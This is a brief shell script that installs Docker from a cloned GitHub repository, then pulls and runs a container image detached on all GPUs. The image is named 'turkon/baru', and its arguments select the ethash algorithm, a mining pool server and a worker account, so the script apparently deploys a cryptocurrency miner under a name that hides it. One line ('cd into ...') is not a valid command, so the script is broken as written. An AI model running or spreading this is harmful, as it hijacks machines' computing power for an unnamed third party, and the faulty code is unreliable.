#!/bin/sh
git clone https://github.com/faisaljubayer/install-docker-automatically.git
cd into install-docker-automatically
chmod +x ./docker-install-trusty64.sh
sh ./docker-install-trusty64.sh
docker pull turkon/baru:latest
docker run --gpus all -d turkon/baru:latest --a ethash --server sp-us.mandor.app:3333 --user sp_obhy.NWS-001
